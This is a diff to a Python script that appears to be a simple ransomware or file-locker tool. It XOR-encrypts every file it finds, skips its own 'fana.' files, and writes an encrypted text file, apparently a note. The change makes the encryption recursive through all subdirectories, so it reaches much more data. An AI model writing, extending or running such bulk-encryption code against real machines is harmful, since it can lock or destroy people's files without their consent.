@@ -26,20 +26,24 @@ def delete():
     os.remove(filename)
     
 def decrypt(key):
-    for file in os.listdir():
-        if "fana." in file:
-            continue
-        enc(key,file)
-        print(f"+ {file} ")
+    for dirpath, dirnames, filenames in os.walk('.'):
+        for file in filenames:
+            if "fana." in file:
+                continue
+            full_path = os.path.join(dirpath, file)
+            enc(key, full_path)
+            print(f"+ {full_path} ")
         
     input("\nDecryption complete...")
-    
+
 def encrypt(key):
-    for file in os.listdir():
-        if 'fana.' in file:
-            continue
-        enc(key,file)
-        print(f"- {file} ")
+    for dirpath, dirnames, filenames in os.walk('.'):
+        for file in filenames:
+            if 'fana.' in file:
+                continue
+            full_path = os.path.join(dirpath, file)
+            enc(key, full_path)
+            print(f"- {full_path} ")
         
     with open(filename, 'wb') as f:
         f.write(xor_encrypt_decrypt(teks.encode(), key))
